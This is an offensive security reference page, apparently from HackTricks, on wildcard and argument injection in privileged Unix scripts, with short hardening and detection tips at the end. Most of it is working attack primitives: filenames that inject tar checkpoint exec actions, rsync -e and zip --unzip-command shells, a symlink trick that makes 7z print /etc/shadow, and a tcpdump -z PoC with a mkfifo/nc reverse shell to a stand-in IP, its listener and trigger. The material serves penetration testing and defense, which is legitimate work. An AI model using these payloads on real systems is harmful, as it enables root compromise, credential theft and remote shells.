# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** happens when a privileged script runs a Unix binary such as `tar`, `chown`, `rsync`, `zip`, `7z`, … with an unquoted wildcard like `*`.  
> Since the shell expands the wildcard **before** executing the binary, an attacker who can create files in the working directory can craft filenames that begin with `-` so they are interpreted as **options instead of data**, effectively smuggling arbitrary flags or even commands.  
> This page collects the most useful primitives, recent research and modern detections for 2023-2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:

```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```

When root later executes something like:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

`--reference=/root/secret``file` is injected, causing *all* matching files to inherit the ownership/permissions of `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
See also the classic DefenseCode paper for details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Execute arbitrary commands by abusing the **checkpoint** feature:

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

Once root runs e.g. `tar -czf /root/backup.tgz *`, `shell.sh` is executed as root.

### bsdtar / macOS 14+

The default `tar` on recent macOS (based on `libarchive`) does *not* implement `--checkpoint`, but you can still achieve code-execution with the **--use-compress-program** flag that allows you to specify an external compressor.

```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
When a privileged script runs `tar -cf backup.tar *`, `/bin/sh` will be started. 

---

## rsync

`rsync` lets you override the remote shell or even the remote binary via command-line flags that start with `-e` or `--rsync-path`:

```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

If root later archives the directory with `rsync -az * backup:/srv/`, the injected flag spawns your shell on the remote side.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Even when the privileged script *defensively* prefixes the wildcard with `--` (to stop option parsing), the 7-Zip format supports **file list files** by prefixing the filename with `@`.  Combining that with a symlink lets you *exfiltrate arbitrary files*:

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

If root executes something like:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip will attempt to read `root.txt` (→ `/etc/shadow`) as a file list and will bail out, **printing the contents to stderr**.

---

## zip

`zip` supports the flag `--unzip-command` that is passed *verbatim* to the system shell when the archive will be tested:

```bash
zip result.zip files -T --unzip-command "sh -c id"
```

Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

When a restricted shell or vendor wrapper builds a `tcpdump` command line by concatenating user-controlled fields (e.g., a "file name" parameter) without strict quoting/validation, you can smuggle extra `tcpdump` flags. The combo of `-G` (time-based rotation), `-W` (limit number of files), and `-z <cmd>` (post-rotate command) yields arbitrary command execution as the user running tcpdump (often root on appliances).

Preconditions:

- You can influence `argv` passed to `tcpdump` (e.g., via a wrapper like `/debug/tcpdump --filter=... --file-name=<HERE>`).
- The wrapper does not sanitize spaces or `-`-prefixed tokens in the file name field.

Classic PoC (executes a reverse shell script from a writable path):

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Details:

- `-G 1 -W 1` forces an immediate rotate after the first matching packet.
- `-z <cmd>` runs the post-rotate command once per rotation. Many builds execute `<cmd> <savefile>`. If `<cmd>` is a script/interpreter, ensure the argument handling matches your payload.

No-removable-media variants:

- If you have any other primitive to write files (e.g., a separate command wrapper that allows output redirection), drop your script into a known path and trigger `-z /bin/sh /path/script.sh` or `-z /path/script.sh` depending on platform semantics.
- Some vendor wrappers rotate to attacker-controllable locations. If you can influence the rotated path (symlink/directory traversal), you can steer `-z` to execute content you fully control without external media.

Hardening tips for vendors:

- Never pass user-controlled strings directly to `tcpdump` (or any tool) without strict allowlists. Quote and validate.
- Do not expose `-z` functionality in wrappers; run tcpdump with a fixed safe template and disallow extra flags entirely.
- Drop tcpdump privileges (cap_net_admin/cap_net_raw only) or run under a dedicated unprivileged user with AppArmor/SELinux confinement.


## Detection & Hardening

1. **Disable shell globbing** in critical scripts: `set -f` (`set -o noglob`) prevents wildcard expansion.
2. **Quote or escape** arguments: `tar -czf "$dst" -- *` is *not* safe — prefer `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Explicit paths**: Use `/var/www/html/*.log` instead of `*` so attackers cannot create sibling files that start with `-`.
4. **Least privilege**: Run backup/maintenance jobs as an unprivileged service account instead of root whenever possible.
5. **Monitoring**: Elastic’s pre-built rule *Potential Shell via Wildcard Injection* looks for `tar --checkpoint=*`, `rsync -e*`, or `zip --unzip-command` immediately followed by a shell child process. The EQL query can be adapted for other EDRs. 

---

## References

* Elastic Security – Potential Shell via Wildcard Injection Detected rule (last updated 2025)  
* Rutger Flohil – “macOS — Tar wildcard injection” (Dec 18 2024)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}